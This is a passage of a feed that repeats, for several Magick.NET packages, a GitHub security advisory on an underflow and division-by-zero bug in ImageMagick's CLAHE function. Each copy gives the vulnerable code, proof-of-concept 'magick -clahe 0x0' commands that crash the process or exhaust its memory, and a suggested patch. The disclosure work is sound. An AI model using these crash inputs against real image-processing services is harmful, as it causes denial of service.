                       (unsigned long) tile_info.height);
  return (Image *) NULL;
}

ssize_t tile_h_minus1 = (ssize_t)tile_info.height - 1;
if (tile_h_minus1 &lt; 0) {
  ThrowMagickException(exception, GetMagickModule(), OptionError,
                       "CLAHEInvalidTile", "%lux%lu",
                       (unsigned long) tile_info.width,
                       (unsigned long) tile_info.height);
  return (Image *) NULL;
}
p += (ptrdiff_t) clahe_info-&gt;width * tile_h_minus1;
</code></pre>
<p>Notes about <code>exact_tiles_requested</code>: if the CLI/Wand parser already exposes whether <code>!</code> was present, use it. If not, add a parse-time flag so CLAHEImage can know whether <code>0</code> is literal or auto.</p>
<hr>
<h2 id="credit">Credit</h2>
<h3 id="team-whys">Team Whys</h3>
<p><strong>Bug Hunting Master Program, HSpace/Findthegap</strong></p>
<p><strong>Youngmin Kim</strong> 
<a href="mailto:kunshim@naver.com">kunshim@naver.com</a></p>
<p><strong>Woojin Park</strong></p>
<p><a href="https://github.com/jin-156">@jin-156</a>
<a href="mailto:1203kids@gmail.com">1203kids@gmail.com</a></p>
<p><strong>Youngin Won</strong></p>
<p><a href="https://github.com/amethyst0225">@amethyst0225</a>
<a href="mailto:youngin04@korea.ac.kr">youngin04@korea.ac.kr</a></p>
<p><strong>Siyeon Han</strong></p>
<p><a href="https://github.com/hanbunny">@hanbunny</a>
<a href="mailto:kokosyeon@gmail.com">kokosyeon@gmail.com</a></p>
<p><strong>Shinyoung Won</strong></p>
<p><a href="yosimich123@gmail.com">@yosiimich</a>
<a href="mailto:yosimich123@gmail.com">yosimich123@gmail.com</a></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-wpp4-vqfq-v4hp">https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-wpp4-vqfq-v4hp</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-62594">https://nvd.nist.gov/vuln/detail/CVE-2025-62594</a></li>
<li><a href="https://github.com/ImageMagick/ImageMagick/commit/7b47fe369eda90483402fcd3d78fa4167d3bb129">https://github.com/ImageMagick/ImageMagick/commit/7b47fe369eda90483402fcd3d78fa4167d3bb129</a></li>
<li><a href="https://github.com/advisories/GHSA-wpp4-vqfq-v4hp">https://github.com/advisories/GHSA-wpp4-vqfq-v4hp</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-wpp4-vqfq-v4hp</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-10-27T23:33:10.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[Magick.NET-Q8-arm64] ImageMagick CLAHE : Unsigned underflow and division-by-zero lead to OOB pointer arithmetic and process crash (DoS)]]></title>
        <id>https://github.com/advisories/GHSA-wpp4-vqfq-v4hp</id>
        <link href="https://github.com/advisories/GHSA-wpp4-vqfq-v4hp"/>
        <updated>2025-10-31T09:29:26.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>A single root cause in the CLAHE implementation — tile width/height becoming zero — produces two distinct but related unsafe behaviors.
Vulnerabilities exists in the <code>CLAHEImage()</code> function of ImageMagick’s <code>MagickCore/enhance.c</code>.</p>
<ol>
<li>Unsigned integer underflow → out-of-bounds pointer arithmetic (OOB): when <code>tile_info.height == 0</code>, the expression <code>tile_info.height - 1</code> (unsigned) wraps to a very large value; using that value in pointer arithmetic yields a huge offset and OOB memory access (leading to memory corruption, SIGSEGV, or resource exhaustion).</li>
<li><strong>Division/modulus by zero</strong>: where code performs <code>... / tile_info.width</code> or <code>... % tile_info.height</code> without re-checking for zero, causing immediate division-by-zero crashes under sanitizers or <code>abort</code> at runtime.</li>
</ol>
<p>Both behaviors are triggered by the same invalid tile condition (e.g., CLI exact <code>-clahe 0x0!</code> or automatic tile derivation <code>dim &gt;&gt; 3 == 0</code> for very small images). </p>
<hr>
<h2 id="details">Details</h2>
<h3 id="unsigned-underflowcan-lea-to-oob"><strong>Unsigned underflow(can lea to OOB)</strong></h3>
<ul>
<li><p>Location: <code>MagickCore/enhance.c</code>, around line 609</p>
</li>
<li><p>Version tested: 7.1.2-8 (local ASan(undefined). /UBSan build)</p>
</li>
<li><p>Vulnerable code</p>
<p>  enhance.c: 609</p>
<pre><code class="language-c">p += (ptrdiff_t) clahe_info-&gt;width * (tile.height - 1);
</code></pre>
</li>
<li><p>Root Cause</p>
<ul>
<li>If <code>tile.height == 0</code>, then <code>(tile.height - 1)</code> underflows to <code>UINT_MAX</code>.</li>
<li>Multiplication with <code>clahe_info-&gt;width</code> yields a huge value close to <code>SIZE_MAX</code>.</li>
<li>Adding this to <code>p</code> causes pointer arithmetic underflow.</li>
</ul>
</li>
</ul>
<h3 id="division-by-zero"><strong>Division-by-zero</strong></h3>
<ul>
<li><p>File / Location: <code>MagickCore/enhance.c</code>, around line 669</p>
</li>
<li><p>Version tested: 7.1.2-8 (local ASan(undefined). /UBSan build)</p>
</li>
<li><p>vulnerable code</p>
<p>  enhance.c: 669-673</p>
<pre><code class="language-c"> if ((image-&gt;columns % tile_info.width) != 0)
    tile_info.x=(ssize_t) (tile_info.width-(image-&gt;columns % tile_info.width));
  tile_info.y=0;
  if ((image-&gt;rows % tile_info.height) != 0)
    tile_info.y=(ssize_t) (tile_info.height-(image-&gt;rows % tile_info.height));
</code></pre>
</li>
<li><p>Root cause</p>
<p>  Missing input validation / bounds checks after computing default tile dimensions:</p>
<p>  If either <code>tile_info.width</code> or <code>tile_info.height</code> is 0, this triggers a division by zero. Zeros can reach this point through:</p>
<ol>
<li>Exact tiles: CLI <code>clahe 0x0!</code> (the <code>!</code> forces zero to be used verbatim).</li>
<li>Auto tiles on tiny images: When a requested tile is <code>0</code> (no <code>!</code>), the code derives a default from the image size (e.g., <code>dim &gt;&gt; 3</code>). For images with <code>dim &lt; 8</code>, this result is 0 unless clamped.</li>
</ol>
</li>
</ul>
<hr>
<h2 id="reproduction">Reproduction</h2>
<h3 id="unsigned-underflow"><strong>Unsigned underflow</strong></h3>
<p><strong>Environment</strong></p>
<p>Built with AddressSanitizer and UndefinedBehaviorSanitizer enabled.</p>
<pre><code class="language-c">export UBSAN_OPTIONS=print_stacktrace=1:halt_on_error=1
export ASAN_OPTIONS=abort_on_error=1:allocator_may_return_null=1:detect_leaks=0
</code></pre>
<p><strong>Command</strong></p>
<pre><code class="language-bash">./magick xc:black -clahe 0x0 null:
</code></pre>
<p><strong>Output</strong></p>
<pre><code>MagickCore/enhance.c:609:6: runtime error: addition of unsigned offset overflowed
SUMMARY: UndefinedBehaviorSanitizer: undefined-behavior MagickCore/enhance.c:609:6 in CLAHEImage
</code></pre>
<p><code>./magick -size 10x10 xc:black -clahe 0x0 null:</code></p>
<img src="https://github.com/user-attachments/assets/cd9637ee-1d03-4066-834d-fda22410dd8b" alt="image" height="64" width="1068">

<p>memory region corruption.</p>
<p><code>./magick -size 2000x2000 xc:black -clahe 0x0 null:</code></p>
<img src="https://github.com/user-attachments/assets/ecbab79c-a3c2-4e8c-96c9-8e2aa8f0d2b2" alt="image" height="70" width="1069">

<p>→ Significant memory consumption and evidence of memory region corruption.</p>
<p><code>./magick -size 4000x4000 xc:black -clahe 0x0 null:</code></p>
<img src="https://github.com/user-attachments/assets/63a7cec5-616b-4aa5-87f3-a546a87e6625" alt="image" height="49" width="776">

<p>→ Much larger memory usage; process appears to be aggressively consuming cache and address space.</p>
<p><code>./magick -size 8000x8000 xc:black -clahe 0x0 null:</code></p>
<img src="https://github.com/user-attachments/assets/48b3aac8-98b3-4fbb-a5ca-4e7936bca44b" alt="image" height="46" width="748">

<p>→ Memory usage escalates further and begins exhausting available cache. If left running, the process is likely to crash (DoS) after sustained allocation attempts.</p>
<h3 id="division-by-zero-1"><strong>Division-by-zero</strong></h3>
<p><strong>Environment:</strong> ASan/UBSan-enabled build.</p>
<pre><code class="language-c">export UBSAN_OPTIONS=print_stacktrace=1:halt_on_error=1
export ASAN_OPTIONS=abort_on_error=1:allocator_may_return_null=1:detect_leaks=0
</code></pre>
<p><strong>Command</strong></p>
<pre><code class="language-bash">./magick -size 16x2 gradient: -type TrueColor -depth 8 -clahe 0x0! null:
</code></pre>
<p><strong>Output</strong></p>
<img src="https://github.com/user-attachments/assets/cfe44432-b429-49e4-8673-2ed55ba9a961" alt="image" height="818" width="1915">

<p><strong>Notes:</strong> Without sanitizers, the process may terminate with just <code>Aborted</code> (still DoS).</p>
<hr>
<h2 id="impact">Impact</h2>
<ul>
<li>Primary: Denial-of-Service — crash or sustained resource exhaustion (memory/cache thrash) when processing crafted parameters or small images via CLI or API. Attackers can trivially trigger via <code>clahe 0x0!</code> or by uploading very small images to services using ImageMagick.</li>
<li>Secondary (theoretical): OOB memory accesses and memory corruption could potentially be combined with other vulnerabilities to achieve more severe outcomes; however, no reliable code execution was demonstrated from these PoCs alone.</li>
</ul>
<hr>
<h2 id="suggested-concrete-patch-snippets">Suggested concrete patch snippets</h2>
<p>Apply in <code>CLAHEImage()</code> after <code>tile_info</code> is computed but <strong>before</strong> any division/modulus/pointer arithmetic:</p>
<pre><code class="language-c">if (exact_tiles_requested &amp;&amp; (tile_info.width == 0 || tile_info.height == 0)) {
  ThrowMagickException(exception, GetMagickModule(), OptionError,
                       "CLAHEInvalidTile", "%lux%lu",
                       (unsigned long) tile_info.width,
                       (unsigned long) tile_info.height);
  return (Image *) NULL;
}

if (!exact_tiles_requested) {
  tile_info.width  = (tile_info.width  == 0) ? MagickMax((size_t)1, image-&gt;columns &gt;&gt; 3) : tile_info.width;
  tile_info.height = (tile_info.height == 0) ? MagickMax((size_t)1, image-&gt;rows    &gt;&gt; 3) : tile_info.height;
}

if (tile_info.width == 0 || tile_info.height == 0) {
  ThrowMagickException(exception, GetMagickModule(), OptionError,
                       "CLAHEInvalidTile", "%lux%lu",
                       (unsigned long) tile_info.width,
                       (unsigned long) tile_info.height);
  return (Image *) NULL;
}

ssize_t tile_h_minus1 = (ssize_t)tile_info.height - 1;
if (tile_h_minus1 &lt; 0) {
  ThrowMagickException(exception, GetMagickModule(), OptionError,
                       "CLAHEInvalidTile", "%lux%lu",
                       (unsigned long) tile_info.width,
                       (unsigned long) tile_info.height);
  return (Image *) NULL;
}
p += (ptrdiff_t) clahe_info-&gt;width * tile_h_minus1;
</code></pre>
<p>Notes about <code>exact_tiles_requested</code>: if the CLI/Wand parser already exposes whether <code>!</code> was present, use it. If not, add a parse-time flag so CLAHEImage can know whether <code>0</code> is literal or auto.</p>
<hr>
<h2 id="credit">Credit</h2>
<h3 id="team-whys">Team Whys</h3>
<p><strong>Bug Hunting Master Program, HSpace/Findthegap</strong></p>
<p><strong>Youngmin Kim</strong> 
<a href="mailto:kunshim@naver.com">kunshim@naver.com</a></p>
<p><strong>Woojin Park</strong></p>
<p><a href="https://github.com/jin-156">@jin-156</a>
<a href="mailto:1203kids@gmail.com">1203kids@gmail.com</a></p>
<p><strong>Youngin Won</strong></p>
<p><a href="https://github.com/amethyst0225">@amethyst0225</a>
<a href="mailto:youngin04@korea.ac.kr">youngin04@korea.ac.kr</a></p>
<p><strong>Siyeon Han</strong></p>
<p><a href="https://github.com/hanbunny">@hanbunny</a>
<a href="mailto:kokosyeon@gmail.com">kokosyeon@gmail.com</a></p>
<p><strong>Shinyoung Won</strong></p>
<p><a href="yosimich123@gmail.com">@yosiimich</a>
<a href="mailto:yosimich123@gmail.com">yosimich123@gmail.com</a></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-wpp4-vqfq-v4hp">https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-wpp4-vqfq-v4hp</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-62594">https://nvd.nist.gov/vuln/detail/CVE-2025-62594</a></li>
<li><a href="https://github.com/ImageMagick/ImageMagick/commit/7b47fe369eda90483402fcd3d78fa4167d3bb129">https://github.com/ImageMagick/ImageMagick/commit/7b47fe369eda90483402fcd3d78fa4167d3bb129</a></li>
<li><a href="https://github.com/advisories/GHSA-wpp4-vqfq-v4hp">https://github.com/advisories/GHSA-wpp4-vqfq-v4hp</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-wpp4-vqfq-v4hp</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-10-27T23:33:10.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[Magick.NET-Q16-OpenMP-x64] ImageMagick CLAHE : Unsigned underflow and division-by-zero lead to OOB pointer arithmetic and process crash (DoS)]]></title>
        <id>https://github.com/advisories/GHSA-wpp4-vqfq-v4hp</id>
        <link href="https://github.com/advisories/GHSA-wpp4-vqfq-v4hp"/>
        <updated>2025-10-31T09:29:26.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>A single root cause in the CLAHE implementation — tile width/height becoming zero — produces two distinct but related unsafe behaviors.
Vulnerabilities exists in the <code>CLAHEImage()</code> function of ImageMagick’s <code>MagickCore/enhance.c</code>.</p>
<ol>
<li>Unsigned integer underflow → out-of-bounds pointer arithmetic (OOB): when <code>tile_info.height == 0</code>, the expression <code>tile_info.height - 1</code> (unsigned) wraps to a very large value; using that value in pointer arithmetic yields a huge offset and OOB memory access (leading to memory corruption, SIGSEGV, or resource exhaustion).</li>
<li><strong>Division/modulus by zero</strong>: where code performs <code>... / tile_info.width</code> or <code>... % tile_info.height</code> without re-checking for zero, causing immediate division-by-zero crashes under sanitizers or <code>abort</code> at runtime.</li>
</ol>
<p>Both behaviors are triggered by the same invalid tile condition (e.g., CLI exact <code>-clahe 0x0!</code> or automatic tile derivation <code>dim &gt;&gt; 3 == 0</code> for very small images). </p>
<hr>
<h2 id="details">Details</h2>
<h3 id="unsigned-underflowcan-lea-to-oob"><strong>Unsigned underflow(can lea to OOB)</strong></h3>
<ul>
<li><p>Location: <code>MagickCore/enhance.c</code>, around line 609</p>
</li>
<li><p>Version tested: 7.1.2-8 (local ASan(undefined). /UBSan build)</p>
</li>
<li><p>Vulnerable code</p>
<p>  enhance.c: 609</p>
<pre><code class="language-c">p += (ptrdiff_t) clahe_info-&gt;width * (tile.height - 1);
</code></pre>
</li>
<li><p>Root Cause</p>
<ul>
<li>If <code>tile.height == 0</code>, then <code>(tile.height - 1)</code> underflows to <code>UINT_MAX</code>.</li>
<li>Multiplication with <code>clahe_info-&gt;width</code> yields a huge value close to <code>SIZE_MAX</code>.</li>
<li>Adding this to <code>p</code> causes pointer arithmetic underflow.</li>
</ul>
</li>
</ul>
<h3 id="division-by-zero"><strong>Division-by-zero</strong></h3>
<ul>
<li><p>File / Location: <code>MagickCore/enhance.c</code>, around line 669</p>
</li>
<li><p>Version tested: 7.1.2-8 (local ASan(undefined). /UBSan build)</p>
</li>
<li><p>vulnerable code</p>
<p>  enhance.c: 669-673</p>
<pre><code class="language-c"> if ((image-&gt;columns % tile_info.width) != 0)
    tile_info.x=(ssize_t) (tile_info.width-(image-&gt;columns % tile_info.width));
  tile_info.y=0;
  if ((image-&gt;rows % tile_info.height) != 0)
    tile_info.y=(ssize_t) (tile_info.height-(image-&gt;rows % tile_info.height));
</code></pre>
</li>
<li><p>Root cause</p>
<p>  Missing input validation / bounds checks after computing default tile dimensions:</p>
<p>  If either <code>tile_info.width</code> or <code>tile_info.height</code> is 0, this triggers a division by zero. Zeros can reach this point through:</p>
<ol>
<li>Exact tiles: CLI <code>clahe 0x0!</code> (the <code>!</code> forces zero to be used verbatim).</li>
<li>Auto tiles on tiny images: When a requested tile is <code>0</code> (no <code>!</code>), the code derives a default from the image size (e.g., <code>dim &gt;&gt; 3</code>). For images with <code>dim &lt; 8</code>, this result is 0 unless clamped.</li>
</ol>
</li>
</ul>
<hr>
<h2 id="reproduction">Reproduction</h2>
<h3 id="unsigned-underflow"><strong>Unsigned underflow</strong></h3>
<p><strong>Environment</strong></p>
<p>Built with AddressSanitizer and UndefinedBehaviorSanitizer enabled.</p>
<pre><code class="language-c">export UBSAN_OPTIONS=print_stacktrace=1:halt_on_error=1
export ASAN_OPTIONS=abort_on_error=1:allocator_may_return_null=1:detect_leaks=0
</code></pre>
<p><strong>Command</strong></p>
<pre><code class="language-bash">./magick xc:black -clahe 0x0 null:
</code></pre>
<p><strong>Output</strong></p>
<pre><code>MagickCore/enhance.c:609:6: runtime error: addition of unsigned offset overflowed
SUMMARY: UndefinedBehaviorSanitizer: undefined-behavior MagickCore/enhance.c:609:6 in CLAHEImage
</code></pre>
<p><code>./magick -size 10x10 xc:black -clahe 0x0 null:</code></p>
<img src="https://github.com/user-attachments/assets/cd9637ee-1d03-4066-834d-fda22410dd8b" alt="image" height="64" width="1068">

<p>memory region corruption.</p>
<p><code>./magick -size 2000x2000 xc:black -clahe 0x0 null:</code></p>
<img src="https://github.com/user-attachments/assets/ecbab79c-a3c2-4e8c-96c9-8e2aa8f0d2b2" alt="image" height="70" width="1069">

<p>→ Significant memory consumption and evidence of memory region corruption.</p>
<p><code>./magick -size 4000x4000 xc:black -clahe 0x0 null:</code></p>
<img src="https://github.com/user-attachments/assets/63a7cec5-616b-4aa5-87f3-a546a87e6625" alt="image" height="49" width="776">

<p>→ Much larger memory usage; process appears to be aggressively consuming cache and address space.</p>
<p><code>./magick -size 8000x8000 xc:black -clahe 0x0 null:</code></p>
<img src="https://github.com/user-attachments/assets/48b3aac8-98b3-4fbb-a5ca-4e7936bca44b" alt="image" height="46" width="748">

<p>→ Memory usage escalates further and begins exhausting available cache. If left running, the process is likely to crash (DoS) after sustained allocation attempts.</p>
<h3 id="division-by-zero-1"><strong>Division-by-zero</strong></h3>
<p><strong>Environment:</strong> ASan/UBSan-enabled build.</p>
<pre><code class="language-c">export UBSAN_OPTIONS=print_stacktrace=1:halt_on_error=1
export ASAN_OPTIONS=abort_on_error=1:allocator_may_return_null=1:detect_leaks=0
</code></pre>
<p><strong>Command</strong></p>
<pre><code class="language-bash">./magick -size 16x2 gradient: -type TrueColor -depth 8 -clahe 0x0! null:
</code></pre>
<p><strong>Output</strong></p>
<img src="https://github.com/user-attachments/assets/cfe44432-b429-49e4-8673-2ed55ba9a961" alt="image" height="818" width="1915">

<p><strong>Notes:</strong> Without sanitizers, the process may terminate with just <code>Aborted</code> (still DoS).</p>
<hr>
<h2 id="impact">Impact</h2>
<ul>
<li>Primary: Denial-of-Service — crash or sustained resource exhaustion (memory/cache thrash) when processing crafted parameters or small images via CLI or API. Attackers can trivially trigger via <code>clahe 0x0!</code> or by uploading very small images to services using ImageMagick.</li>
<li>Secondary (theoretical): OOB memory accesses and memory corruption could potentially be combined with other vulnerabilities to achieve more severe outcomes; however, no reliable code execution was demonstrated from these PoCs alone.</li>
</ul>
<hr>
<h2 id="suggested-concrete-patch-snippets">Suggested concrete patch snippets</h2>
<p>Apply in <code>CLAHEImage()</code> after <code>tile_info</code> is computed but <strong>before</strong> any division/modulus/pointer arithmetic:</p>
<pre><code class="language-c">if (exact_tiles_requested &amp;&amp; (tile_info.width == 0 || tile_info.height == 0)) {
  ThrowMagickException(exception, GetMagickModule(), OptionError,
                       "CLAHEInvalidTile", "%lux%lu",
                       (unsigned long) tile_info.width,
                       (unsigned long) tile_info.height);
  return (Image *) NULL;
}

if (!exact_tiles_requested) {
  tile_info.width  = (tile_info.width  == 0) ? MagickMax((size_t)1, image-&gt;columns &gt;&gt; 3) : tile_info.width;
  tile_info.height = (tile_info.height == 0) ? MagickMax((size_t)1, image-&gt;rows    &gt;&gt; 3) : tile_info.height;
}

if (tile_info.width == 0 || tile_info.height == 0) {
  ThrowMagickException(exception, GetMagickModule(), OptionError,
                       "CLAHEInvalidTile", "%lux%lu",
                       (unsigned long) tile_info.width,
                       (unsigned long) tile_info.height);
  return (Image *) NULL;
}

ssize_t tile_h_minus1 = (ssize_t)tile_info.height - 1;
if (tile_h_minus1 &lt; 0) {
  ThrowMagickException(exception, GetMagickModule(), OptionError,
                       "CLAHEInvalidTile", "%lux%lu",
                       (unsigned long) tile_info.width,
                       (unsigned long) tile_info.height);
  return (Image *) NULL;
}
p += (ptrdiff_t) clahe_info-&gt;width * tile_h_minus1;
</code></pre>
<p>Notes about <code>exact_tiles_requested</code>: if the CLI/Wand parser already exposes whether <code>!</code> was present, use it. If not, add a parse-time flag so CLAHEImage can know whether <code>0</code> is literal or auto.</p>
<hr>
<h2 id="credit">Credit</h2>
<h3 id="team-whys">Team Whys</h3>
<p><strong>Bug Hunting Master Program, HSpace/Findthegap</strong></p>
<p><strong>Youngmin Kim</strong> 
<a href="mailto:kunshim@naver.com">kunshim@naver.com</a></p>
<p><strong>Woojin Park</strong></p>
<p><a href="https://github.com/jin-156">@jin-156</a>
<a href="mailto:1203kids@gmail.com">1203kids@gmail.com</a></p>
<p><strong>Youngin Won</strong></p>
<p><a href="https://github.com/amethyst0225">@amethyst0225</a>
<a href="mailto:youngin04@korea.ac.kr">youngin04@korea.ac.kr</a></p>
<p><strong>Siyeon Han</strong></p>
<p><a href="https://github.com/hanbunny">@hanbunny</a>
<a href="mailto:kokosyeon@gmail.com">kokosyeon@gmail.com</a></p>
<p><strong>Shinyoung Won</strong></p>
<p><a href="yosimich123@gmail.com">@yosiimich</a>
<a href="mailto:yosimich123@gmail.com">yosimich123@gmail.com</a></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-wpp4-vqfq-v4hp">https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-wpp4-vqfq-v4hp</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-62594">https://nvd.nist.gov/vuln/detail/CVE-2025-62594</a></li>
<li><a href="https://github.com/ImageMagick/ImageMagick/commit/7b47fe369eda90483402fcd3d78fa4167d3bb129">https://github.com/ImageMagick/ImageMagick/commit/7b47fe369eda90483402fcd3d78fa4167d3bb129</a></li>
<li><a href="https://github.com/advisories/GHSA-wpp4-vqfq-v4hp">https://github.com/advisories/GHSA-wpp4-vqfq-v4hp</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-wpp4-vqfq-v4hp</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-10-27T23:33:10.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[Magick.NET-Q16-HDRI-OpenMP-x64] ImageMagick CLAHE : Unsigned underflow and division-by-zero lead to OOB pointer arithmetic and process crash (DoS)]]></title>
        <id>https://github.com/advisories/GHSA-wpp4-vqfq-v4hp</id>
        <link href="https://github.com/advisories/GHSA-wpp4-vqfq-v4hp"/>
        <updated>2025-10-31T09:29:26.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>A single root cause in the CLAHE implementation — tile width/height becoming zero — produces two distinct but related unsafe behaviors.
Vulnerabilities exists in the <code>CLAHEImage()</code> function of ImageMagick’s <code>MagickCore/enhance.c</code>.</p>
<ol>
<li>Unsigned integer underflow → out-of-bounds pointer arithmetic (OOB): when <code>tile_info.height == 0</code>, the expression <code>tile_info.height - 1</code> (unsigned) wraps to a very large value; using that value in pointer arithmetic yields a huge offset and OOB memory access (leading to memory corruption, SIGSEGV, or resource exhaustion).</li>
<li><strong>Division/modulus by zero</strong>: where code performs <code>... / tile_info.width</code> or <code>... % tile_info.height</code> without re-checking for zero, causing immediate division-by-zero crashes under sanitizers or <code>abort</code> at runtime.</li>
</ol>
<p>Both behaviors are triggered by the same invalid tile condition (e.g., CLI exact <code>-clahe 0x0!</code> or automatic tile derivation <code>dim &gt;&gt; 3 == 0</code> for very small images). </p>
<hr>
<h2 id="details">Details</h2>
<h3 id="unsigned-underflowcan-lea-to-oob"><strong>Unsigned underflow(can lea to OOB)</strong></h3>
<ul>
<li><p>Location: <code>MagickCore/enhance.c</code>, around line 609</p>
</li>
<li><p>Version tested: 7.1.2-8 (local ASan(undefined). /UBSan build)</p>
</li>
<li><p>Vulnerable code</p>
<p>  enhance.c: 609</p>
<pre><code class="language-c">p += (ptrdiff_t) clahe_info-&gt;width * (tile.height - 1);
</code></pre>
</li>
<li><p>Root Cause</p>
<ul>
<li>If <code>tile.height == 0</code>, then <code>(tile.height - 1)</code> underflows to <code>UINT_MAX</code>.</li>
<li>Multiplication with <code>clahe_info-&gt;width</code> yields a huge value close to <code>SIZE_MAX</code>.</li>
<li>Adding this to <code>p</code> causes pointer arithmetic underflow.</li>
</ul>
</li>
</ul>
<h3 id="division-by-zero"><strong>Division-by-zero</strong></h3>
<ul>
<li><p>File / Location: <code>MagickCore/enhance.c</code>, around line 669</p>
</li>
<li><p>Version tested: 7.1.2-8 (local ASan(undefined). /UBSan build)</p>
</li>
<li><p>vulnerable code</p>
<p>  enhance.c: 669-673</p>
<pre><code class="language-c"> if ((image-&gt;columns % tile_info.width) != 0)
    tile_info.x=(ssize_t) (tile_info.width-(image-&gt;columns % tile_info.width));
  tile_info.y=0;
  if ((image-&gt;rows % tile_info.height) != 0)
    tile_info.y=(ssize_t) (tile_info.height-(image-&gt;rows % tile_info.height));
</code></pre>
</li>
<li><p>Root cause</p>
<p>  Missing input validation / bounds checks after computing default tile dimensions:</p>
<p>  If either <code>tile_info.width</code> or <code>tile_info.height</code> is 0, this triggers a division by zero. Zeros can reach this point through:</p>
<ol>
<li>Exact tiles: CLI <code>clahe 0x0!</code> (the <code>!</code> forces zero to be used verbatim).</li>
<li>Auto tiles on tiny images: When a requested tile is <code>0</code> (no <code>!</code>), the code derives a default from the image size (e.g., <code>dim &gt;&gt; 3</code>). For images with <code>dim &lt; 8</code>, this result is 0 unless clamped.</li>
</ol>
</li>
</ul>
<hr>
<h2 id="reproduction">Reproduction</h2>
<h3 id="unsigned-underflow"><strong>Unsigned underflow</strong></h3>
<p><strong>Environment</strong></p>
<p>Built with AddressSanitizer and UndefinedBehaviorSanitizer enabled.</p>
<pre><code class="language-c">export UBSAN_OPTIONS=print_stacktrace=1:halt_on_error=1
export ASAN_OPTIONS=abort_on_error=1:allocator_may_return_null=1:detect_leaks=0
</code></pre>
<p><strong>Command</strong></p>
<pre><code class="language-bash">./magick xc:black -clahe 0x0 null:
</code></pre>
<p><strong>Output</strong></p>
<pre><code>MagickCore/enhance.c:609:6: runtime error: addition of unsigned offset overflowed
SUMMARY: UndefinedBehaviorSanitizer: undefined-behavior MagickCore/enhance.c:609:6 in CLAHEImage
</code></pre>
<p><code>./magick -size 10x10 xc:black -clahe 0x0 null:</code></p>
<img src="https://github.com/user-attachments/assets/cd9637ee-1d03-4066-834d-fda22410dd8b" alt="image" height="64" width="1068">

<p>memory region corruption.</p>
<p><code>./magick -size 2000x2000 xc:black -clahe 0x0 null:</code></p>
<img src="https://github.com/user-attachments/assets/ecbab79c-a3c2-4e8c-96c9-8e2aa8f0d2b2" alt="image" height="70" width="1069">

<p>→ Significant memory consumption and evidence of memory region corruption.</p>
<p><code>./magick -size 4000x4000 xc:black -clahe 0x0 null:</code></p>
<img src="https://github.com/user-attachments/assets/63a7cec5-616b-4aa5-87f3-a546a87e6625" alt="image" height="49" width="776">

<p>→ Much larger memory usage; process appears to be aggressively consuming cache and address space.</p>
<p><code>./magick -size 8000x8000 xc:black -clahe 0x0 null:</code></p>
<img src="https://github.com/user-attachments/assets/48b3aac8-98b3-4fbb-a5ca-4e7936bca44b" alt="image" height="46" width="748">

<p>→ Memory usage escalates further and begins exhausting available cache. If left running, the process is likely to crash (DoS) after sustained allocation attempts.</p>
<h3 id="division-by-zero-1"><strong>Division-by-zero</strong></h3>
<p><strong>Environment:</strong> ASan/UBSan-enabled build.</p>
<pre><code class="language-c">export UBSAN_OPTIONS=print_stacktrace=1:halt_on_error=1
export ASAN_OPTIONS=abort_on_error=1:allocator_may_return_null=1:detect_leaks=0
</code></pre>
<p><strong>Command</strong></p>
<pre><code class="language-bash">./magick -size 16x2 gradient: -type TrueColor -depth 8 -clahe 0x0! null:
</code></pre>
<p><strong>Output</strong></p>
<img src="https://github.com/user-attachments/assets/cfe44432-b429-49e4-8673-2ed55ba9a961" alt="image" height="818" width="1915">

<p><strong>Notes:</strong> Without sanitizers, the process may terminate with just <code>Aborted</code> (still DoS).</p>
<hr>
<h2 id="impact">Impact</h2>
<ul>
<li>Primary: Denial-of-Service — crash or sustained resource exhaustion (memory/cache thrash) when processing crafted parameters or small images via CLI or API. Attackers can trivially trigger via <code>clahe 0x0!</code> or by uploading very small images to services using ImageMagick.</li>
<li>Secondary (theoretical): OOB memory accesses and memory corruption could potentially be combined with other vulnerabilities to achieve more severe outcomes; however, no reliable code execution was demonstrated from these PoCs alone.</li>
</ul>
<hr>
<h2 id="suggested-concrete-patch-snippets">Suggested concrete patch snippets</h2>
<p>Apply in <code>CLAHEImage()</code> after <code>tile_info</code> is computed but <strong>before</strong> any division/modulus/pointer arithmetic:</p>
<pre><code class="language-c">if (exact_tiles_requested &amp;&amp; (tile_info.width == 0 || tile_info.height == 0)) {
  ThrowMagickException(exception, GetMagickModule(), OptionError,
                       "CLAHEInvalidTile", "%lux%lu",
                       (unsigned long) tile_info.width,
                       (unsigned long) tile_info.height);
  return (Image *) NULL;
}

if (!exact_tiles_requested) {
  tile_info.width  = (tile_info.width  == 0) ? MagickMax((size_t)1, image-&gt;columns &gt;&gt; 3) : tile_info.width;
  tile_info.height = (tile_info.height == 0) ? MagickMax((size_t)1, image-&gt;rows    &gt;&gt; 3) : tile_info.height;
}

if (tile_info.width == 0 || tile_info.height == 0) {
  ThrowMagickException(exception, GetMagickModule(), OptionError,
                       "CLAHEInvalidTile", "%lux%lu",
